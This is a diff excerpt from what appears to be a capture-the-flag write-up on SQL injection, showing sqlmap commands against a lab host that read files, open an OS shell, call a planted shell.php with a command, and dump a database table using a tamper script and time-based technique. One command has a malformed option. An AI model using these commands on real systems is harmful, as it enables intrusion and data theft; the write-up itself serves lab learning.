@@ -151,7 +151,7 @@ sqlmap -u "http://134.209.176.83:31022/?id=1" --file-read "/var/www/html/flag.tx
    47  sqlmap -u "http://134.209.176.83:31022/?id=1" --os-shell
    in browser DO http://134.209.176.83:31022/shell.php?cmd=cat+/flag.txt
 + What's the contents of table final_flag?  
-Playing around with the shopping items and adding to cart registered the post request. Do the old save to a text file. Add the old ‘-p id’ which we got from the POST request and our ‘common’ between tamper script we do some quick ‘-D’ database enumeration to tell us it’s in the production database and our database management system is MySql and it’s technique T (Time-Based boolean) we get the above flag.
+Playing around with the shopping items and adding to cart registered the post request. Do the old save to a text file. Add the old ‘-p id’ which we got from the POST request and our ‘common’ between tamper script we do some quick ‘-D’ database enumeration to tell us it’s in the production database and our database management system is MySql and it’s technique T (Time-Based boolean) we get the above flag.  
 sqlmap -r shoe.txt -p 'id' --tamper=between -T final_flag -D production --dump dbsm=MySql --technique=T
   
   
